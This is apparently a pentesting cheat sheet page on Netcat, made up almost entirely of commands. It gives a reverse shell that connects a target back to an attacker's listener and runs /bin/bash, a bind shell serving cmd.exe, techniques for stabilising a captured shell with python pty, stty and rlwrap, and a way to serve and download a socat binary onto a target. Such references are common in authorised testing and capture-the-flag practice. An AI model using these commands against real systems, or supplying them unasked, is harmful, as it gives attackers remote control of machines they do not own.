# Netcat

**Reverse Shell**

*   On attacking machine

    * `sudo nc -nlvp 443`

    On target

    * `nc <LOCAL-IP> <PORT> -e /bin/bash`

**Bind** **Shell**

* On attacking machine
  * `nc <MACHINE_IP> <port>`
* On target
  * `nc -lvnp -e "cmd.exe"`

**Netcat shell stabilization**

* _Technique 1: Python (Linux only)_
  * `python -c 'import pty;pty.spawn("/bin/bash")'`
  * `export TERM=xterm`
  * Background the shell using ctrl + z\
    ****In attacker terminal\
    `stty raw -echo; fg`
  * Reset shell by \
    `reset`

![
Python](<../../../.gitbook/assets/image (3).png>)

* _Technique 2: rlwrap (Windows and Linux)_
  * sudo apt install rlwrap
  * Windows
    * rlwrap nc -lvnp
  * Linux
    * rlwrap nc -lvnp
    * Background the shell using ctrl + z\
      ****In attacker terminal\
      `stty raw -echo; fg`
    * Reset shell by \
      `reset`
* &#x20;_Technique 3: Socat (Linux only)_
  * Move socat compiled binary to target machine\
    sudo python3 -m http.server 80\
    wget /socat -O /tmp/socat
* Change terminal tty size
  * Automatically for regular shell, but manual for reverse or bind shell&#x20;
  * Open terminal and type\
    stty -a\
    Note the numbers
  * In reverse/bind shell type\
    `stty rows <number>`\
    `stty cols <number>`

![stty -a](<../../../.gitbook/assets/image (9).png>)
